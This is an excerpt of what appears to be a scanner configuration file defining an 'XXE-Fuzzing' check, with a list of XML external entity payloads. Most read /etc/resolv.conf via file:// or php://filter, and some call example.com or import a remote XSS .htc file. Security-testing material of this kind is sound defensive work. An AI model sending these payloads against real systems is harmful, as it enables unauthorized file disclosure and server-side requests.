[
 {
  ...
  "Scanner": 1, 
  "Payloads": [
   "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/resolv.conf\" >", 
   ...
   "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\" >]><foo>&xxe;</foo>", 
   "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\" >]>", 
   ...
   "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com:443\" >]>", 
   ...
   "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://example.com/xss.htc\"><xss:xss>XSS</xss:xss></HTML>", 
   "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://example.com/xss.htc\">", 
   ...
   "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:copy-of select=\"document('/etc/resolv.conf')\"/></xsl:template></xsl:stylesheet>", 
   ...
   "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\" >]>", 
  ...
  "spaceEncode": false, 
  "payloadPosition": 0, 
  "IssueName": "XXE-Fuzzing", 
  "IssueSeverity": "Information", 
  "IssueConfidence": "Certain", 
  "IssueDetail": "XXE-Fuzzing\n\n<grep>", 
  "RemediationDetail": "", 
  "IssueBackground": "", 
